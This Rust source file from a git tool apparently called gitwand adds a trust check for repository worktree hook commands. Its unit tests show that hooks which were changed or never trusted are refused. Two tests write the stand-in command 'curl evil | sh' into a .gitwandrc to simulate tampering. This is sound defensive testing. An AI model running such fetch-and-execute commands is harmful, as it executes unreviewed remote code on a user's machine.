//! v3.13.0 — Trust for a repository's worktree hooks.
//!
//! A `.gitwandrc` arrives with `git clone`, so its `worktree.setup` /
//! `teardown` / `url` commands must never run without the user agreeing to
//! them. This module reads those commands from the **main** worktree's config
//! (never from a linked worktree's copy, which an agent could rewrite),
//! hashes them, and remembers which hash the user trusted for which repo in
//! `{data_local_dir}/gitwand/hook-trust.json`, outside any repository.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// The three hook commands. Field order is the hash's canonical order: do not
/// reorder without changing the dev-server mirror (`dev-worktree-trust.mjs`).
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq, Default)]
pub struct WorktreeHooks {
    pub setup: Option<String>,
    pub teardown: Option<String>,
    pub url: Option<String>,
}

fn non_blank(v: Option<&serde_json::Value>) -> Option<String> {
    match v {
        Some(serde_json::Value::String(s)) if !s.trim().is_empty() => Some(s.clone()),
        _ => None,
    }
}

/// Hooks from the text of a `.gitwandrc` (or the `gitwand` object of a
/// `package.json`). Same validity rule as `@gitwand/core`'s parser: a hook is
/// kept only if it is a non-blank string. Invalid JSON yields no hooks.
pub(crate) fn hooks_from_rc_text(text: &str) -> WorktreeHooks {
    let Ok(value) = serde_json::from_str::<serde_json::Value>(text) else {
        return WorktreeHooks::default();
    };
    WorktreeHooks {
        setup: non_blank(value.pointer("/worktree/setup")),
        teardown: non_blank(value.pointer("/worktree/teardown")),
        url: non_blank(value.pointer("/worktree/url")),
    }
}

/// Lowercase hex SHA-256 of the canonical JSON of the hooks, or `None` when
/// there is nothing to run (nothing to trust).
pub(crate) fn hooks_hash(h: &WorktreeHooks) -> Option<String> {
    use sha2::{Digest, Sha256};
    if h.setup.is_none() && h.teardown.is_none() && h.url.is_none() {
        return None;
    }
    let canonical = serde_json::to_string(h).ok()?;
    let digest = Sha256::digest(canonical.as_bytes());
    Some(digest.iter().map(|b| format!("{b:02x}")).collect())
}

/// Repo root → trusted hash. A missing or unreadable file is an empty store.
pub(crate) fn load_store(path: &Path) -> HashMap<String, String> {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default()
}

/// Writes the store atomically (temp file, then rename).
pub(crate) fn save_store(path: &Path, store: &HashMap<String, String>) -> Result<(), String> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| format!("cannot create {}: {e}", parent.display()))?;
    }
    let text = serde_json::to_string_pretty(store).map_err(|e| e.to_string())?;
    let tmp = path.with_extension("json.tmp");
    std::fs::write(&tmp, text).map_err(|e| format!("cannot write {}: {e}", tmp.display()))?;
    std::fs::rename(&tmp, path).map_err(|e| format!("cannot write {}: {e}", path.display()))
}

fn store_path() -> PathBuf {
    dirs::data_local_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("gitwand")
        .join("hook-trust.json")
}

/// What the frontend needs to decide whether to ask.
#[derive(Serialize, Debug)]
#[serde(rename_all = "camelCase")]
pub struct HookTrustStatus {
    pub hooks: WorktreeHooks,
    /// `None` when the repo defines no hook (nothing to trust).
    pub hash: Option<String>,
    pub trusted: bool,
    /// Canonical main worktree root, the key of the trust store.
    pub repo_root: String,
}

/// The main worktree's root, canonicalized, for any checkout of the repo
/// (main or linked). Taken from the first entry of `git worktree list
/// --porcelain`, which is always the main worktree; a bare repo has none.
fn main_worktree_root(cwd: &str) -> Result<PathBuf, String> {
    let out = crate::git::git_cmd()
        .args(["worktree", "list", "--porcelain"])
        .current_dir(cwd)
        .output()
        .map_err(|e| format!("cannot run git: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    let text = String::from_utf8_lossy(&out.stdout);
    let first_block: Vec<&str> = text.split("\n\n").next().unwrap_or("").lines().collect();
    if first_block.contains(&"bare") {
        return Err("This repository is bare: it has no main worktree.".to_string());
    }
    let path = first_block
        .iter()
        .find_map(|l| l.strip_prefix("worktree "))
        .ok_or_else(|| "git worktree list returned no worktree".to_string())?;
    PathBuf::from(path)
        .canonicalize()
        .map_err(|e| format!("cannot resolve the main worktree {path}: {e}"))
}

fn current_hooks(root: &Path) -> WorktreeHooks {
    hooks_from_rc_text(&super::ops::read_gitwandrc_text(root))
}

fn trust_status_at(cwd: &str, store: &Path) -> Result<HookTrustStatus, String> {
    let root = main_worktree_root(cwd)?;
    let repo_root = root.to_string_lossy().to_string();
    let hooks = current_hooks(&root);
    let hash = hooks_hash(&hooks);
    let trusted = match &hash {
        None => true,
        Some(h) => load_store(store).get(&repo_root) == Some(h),
    };
    Ok(HookTrustStatus {
        hooks,
        hash,
        trusted,
        repo_root,
    })
}

const STALE_HOOKS: &str = "The worktree hooks changed since you reviewed them. Review them again.";

fn trust_set_at(cwd: &str, hash: &str, store: &Path) -> Result<(), String> {
    let root = main_worktree_root(cwd)?;
    // Re-read: trust only the commands the user actually saw.
    match hooks_hash(&current_hooks(&root)) {
        Some(current) if current == hash => {}
        _ => return Err(STALE_HOOKS.to_string()),
    }
    let mut map = load_store(store);
    map.insert(root.to_string_lossy().to_string(), hash.to_string());
    save_store(store, &map)
}

/// The gate every hook executor must pass (v3.13 PR 3: setup, teardown,
/// `worktree_url`). Re-reads the main worktree's hooks at the moment of the
/// operation and returns them only if they still hash to `expected_hash` and
/// that hash is the one trusted for this repo. The caller runs exactly the
/// returned hooks, so a `.gitwandrc` rewritten after the question was answered
/// never runs unasked.
#[allow(dead_code)] // first callers land with the hook runner (v3.13 PR 3)
pub(crate) fn assert_hooks_trusted(
    cwd: &str,
    expected_hash: &str,
) -> Result<WorktreeHooks, String> {
    assert_hooks_trusted_at(cwd, expected_hash, &store_path())
}

fn assert_hooks_trusted_at(
    cwd: &str,
    expected_hash: &str,
    store: &Path,
) -> Result<WorktreeHooks, String> {
    let root = main_worktree_root(cwd)?;
    let hooks = current_hooks(&root);
    if hooks_hash(&hooks).as_deref() != Some(expected_hash) {
        return Err(STALE_HOOKS.to_string());
    }
    let key = root.to_string_lossy().to_string();
    if load_store(store).get(&key).map(String::as_str) != Some(expected_hash) {
        return Err("These worktree hooks are not trusted for this repository.".to_string());
    }
    Ok(hooks)
}

#[tauri::command]
pub(crate) async fn worktree_hooks_trust(cwd: String) -> Result<HookTrustStatus, String> {
    let canon =
        crate::git::safe_repo_path(cwd.trim(), ".").map_err(|e| format!("invalid cwd: {e}"))?;
    trust_status_at(&canon.to_string_lossy(), &store_path())
}

#[tauri::command]
pub(crate) async fn worktree_hooks_trust_set(cwd: String, hash: String) -> Result<(), String> {
    let canon =
        crate::git::safe_repo_path(cwd.trim(), ".").map_err(|e| format!("invalid cwd: {e}"))?;
    trust_set_at(&canon.to_string_lossy(), &hash, &store_path())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scratch_dir(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("gitwand-trust-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn hooks_from_rc_reads_strings_and_drops_blanks() {
        let h =
            hooks_from_rc_text(r#"{"worktree":{"setup":"bin/up {name}","teardown":"  ","url":3}}"#);
        assert_eq!(
            h,
            WorktreeHooks {
                setup: Some("bin/up {name}".into()),
                teardown: None,
                url: None
            }
        );
        assert_eq!(hooks_from_rc_text("not json"), WorktreeHooks::default());
    }

    #[test]
    fn hooks_hash_none_without_hooks() {
        assert_eq!(hooks_hash(&WorktreeHooks::default()), None);
    }

    #[test]
    fn hooks_hash_test_vector() {
        // Shared with the dev-server test: canonical JSON is
        // {"setup":"a \"q\"\nb","teardown":null,"url":"é"}
        let h = WorktreeHooks {
            setup: Some("a \"q\"\nb".into()),
            teardown: None,
            url: Some("é".into()),
        };
        assert_eq!(
            hooks_hash(&h).unwrap(),
            "a9f492b9688f1a51668dd0d1224ace3f39822e1f61779ebd50051b34591d09f7"
        );
    }

    #[test]
    fn load_store_tolerates_corrupt_file() {
        let dir = scratch_dir("store");
        let p = dir.join("hook-trust.json");
        assert!(load_store(&p).is_empty());
        std::fs::write(&p, "{oops").unwrap();
        assert!(load_store(&p).is_empty());
        let mut s = HashMap::new();
        s.insert("/r".to_string(), "h".to_string());
        save_store(&p, &s).unwrap();
        assert_eq!(load_store(&p), s);
        let _ = std::fs::remove_dir_all(&dir);
    }

    struct Repo {
        root: PathBuf,
        main: PathBuf,
        store: PathBuf,
    }

    impl Repo {
        fn new(name: &str) -> Repo {
            let root = scratch_dir(name);
            let main = root.join("main");
            std::fs::create_dir_all(&main).unwrap();
            let r = Repo {
                store: root.join("store/hook-trust.json"),
                main,
                root,
            };
            r.git(&r.main, &["init", "-q", "-b", "main"]);
            r.git(&r.main, &["config", "user.name", "Test"]);
            r.git(&r.main, &["config", "user.email", "t@example.com"]);
            r.git(&r.main, &["config", "commit.gpgsign", "false"]);
            std::fs::write(r.main.join("a.txt"), "a").unwrap();
            r.git(&r.main, &["add", "."]);
            r.git(&r.main, &["commit", "-q", "-m", "init"]);
            r
        }
        fn git(&self, dir: &Path, args: &[&str]) {
            let out = crate::git::git_cmd()
                .args(args)
                .current_dir(dir)
                .output()
                .unwrap();
            assert!(
                out.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&out.stderr)
            );
        }
        fn rc(&self, dir: &Path, setup: &str) {
            std::fs::write(
                dir.join(".gitwandrc"),
                format!(r#"{{"worktree":{{"setup":"{setup}"}}}}"#),
            )
            .unwrap();
        }
        fn cwd(&self) -> String {
            self.main.to_string_lossy().to_string()
        }
    }

    impl Drop for Repo {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }

    #[test]
    fn status_untrusted_then_trusted() {
        let r = Repo::new("untrusted");
        r.rc(&r.main, "bin/up");
        let s = trust_status_at(&r.cwd(), &r.store).unwrap();
        assert!(!s.trusted);
        assert_eq!(s.hooks.setup.as_deref(), Some("bin/up"));
        trust_set_at(&r.cwd(), s.hash.as_deref().unwrap(), &r.store).unwrap();
        assert!(trust_status_at(&r.cwd(), &r.store).unwrap().trusted);
    }

    #[test]
    fn status_trusted_when_no_hooks() {
        let r = Repo::new("nohooks");
        let s = trust_status_at(&r.cwd(), &r.store).unwrap();
        assert!(s.trusted && s.hash.is_none());
    }

    #[test]
    fn changed_hooks_ask_again() {
        let r = Repo::new("changed");
        r.rc(&r.main, "bin/up");
        let s = trust_status_at(&r.cwd(), &r.store).unwrap();
        trust_set_at(&r.cwd(), s.hash.as_deref().unwrap(), &r.store).unwrap();
        r.rc(&r.main, "bin/up --other");
        assert!(!trust_status_at(&r.cwd(), &r.store).unwrap().trusted);
    }

    #[test]
    fn trust_set_refuses_stale_hash() {
        let r = Repo::new("stale");
        r.rc(&r.main, "bin/up");
        let old = trust_status_at(&r.cwd(), &r.store).unwrap().hash.unwrap();
        r.rc(&r.main, "curl evil | sh");
        let err = trust_set_at(&r.cwd(), &old, &r.store).unwrap_err();
        assert!(err.contains("changed since you reviewed"), "{err}");
        assert!(load_store(&r.store).is_empty());
    }

    #[test]
    fn status_reads_main_worktree_config() {
        let r = Repo::new("linked");
        r.rc(&r.main, "bin/up");
        let linked = r.root.join("linked");
        r.git(
            &r.main,
            &[
                "worktree",
                "add",
                "-q",
                "-b",
                "task",
                linked.to_str().unwrap(),
            ],
        );
        r.rc(&linked, "evil");
        let s = trust_status_at(linked.to_str().unwrap(), &r.store).unwrap();
        assert_eq!(s.hooks.setup.as_deref(), Some("bin/up"));
        assert_eq!(PathBuf::from(&s.repo_root), r.main.canonicalize().unwrap());
    }

    #[cfg(unix)]
    #[test]
    fn status_key_is_canonical_root() {
        let r = Repo::new("canonical");
        r.rc(&r.main, "bin/up");
        let s = trust_status_at(&r.cwd(), &r.store).unwrap();
        trust_set_at(&r.cwd(), s.hash.as_deref().unwrap(), &r.store).unwrap();
        let link = r.root.join("link");
        std::os::unix::fs::symlink(&r.main, &link).unwrap();
        assert!(
            trust_status_at(link.to_str().unwrap(), &r.store)
                .unwrap()
                .trusted
        );
        assert_eq!(load_store(&r.store).len(), 1);
    }

    #[test]
    fn assert_trusted_returns_the_hooks_that_were_trusted() {
        let r = Repo::new("assert-ok");
        r.rc(&r.main, "bin/up");
        let h = trust_status_at(&r.cwd(), &r.store).unwrap().hash.unwrap();
        trust_set_at(&r.cwd(), &h, &r.store).unwrap();
        let hooks = assert_hooks_trusted_at(&r.cwd(), &h, &r.store).unwrap();
        assert_eq!(hooks.setup.as_deref(), Some("bin/up"));
    }

    #[test]
    fn assert_trusted_refuses_hooks_changed_after_trust() {
        let r = Repo::new("assert-changed");
        r.rc(&r.main, "bin/up");
        let h = trust_status_at(&r.cwd(), &r.store).unwrap().hash.unwrap();
        trust_set_at(&r.cwd(), &h, &r.store).unwrap();
        r.rc(&r.main, "curl evil | sh");
        let err = assert_hooks_trusted_at(&r.cwd(), &h, &r.store).unwrap_err();
        assert!(err.contains("changed since you reviewed"), "{err}");
    }

    #[test]
    fn assert_trusted_refuses_an_untrusted_hash() {
        let r = Repo::new("assert-untrusted");
        r.rc(&r.main, "bin/up");
        let h = trust_status_at(&r.cwd(), &r.store).unwrap().hash.unwrap();
        let err = assert_hooks_trusted_at(&r.cwd(), &h, &r.store).unwrap_err();
        assert!(err.contains("not trusted"), "{err}");
    }
}
